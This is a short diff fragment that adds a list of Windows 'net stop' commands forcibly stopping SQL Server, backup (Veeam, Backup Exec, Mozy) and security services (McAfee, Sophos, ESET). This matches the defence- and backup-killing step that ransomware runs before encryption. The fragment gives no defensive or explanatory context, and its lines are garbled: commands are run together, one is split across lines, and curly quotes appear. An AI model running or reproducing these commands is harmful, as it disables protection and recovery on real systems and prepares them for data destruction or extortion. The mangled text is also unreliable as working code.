@@ -1,0 +1,12 @@
+
+net stop MSSQL$TPS /y net stop mfemms /y net stop MsDtsServer100 /y
+net stop MSSQL$SHAREPOINT /y
+net stop WRSVC /y
+net stop mfevtp /y
+net stop msftesql$PROD /y net stop mozyprobackup /y net stop
+MSSQL$SQL_2008 /y net stop SNAC /y
+net stop ReportServer$SQL_2008 /y
+net stop BackupExecAgentAccelerator /y net stop MSSQL$SQLEXPRESS /y
+net stop MSSQL$PRACTTICEBGC /y
+net stop VeeamRESTSvc /y net stop sophossps /y net stop ekrn /y
+net stop MMS /y net stop “Sophos MCS Agent” /y
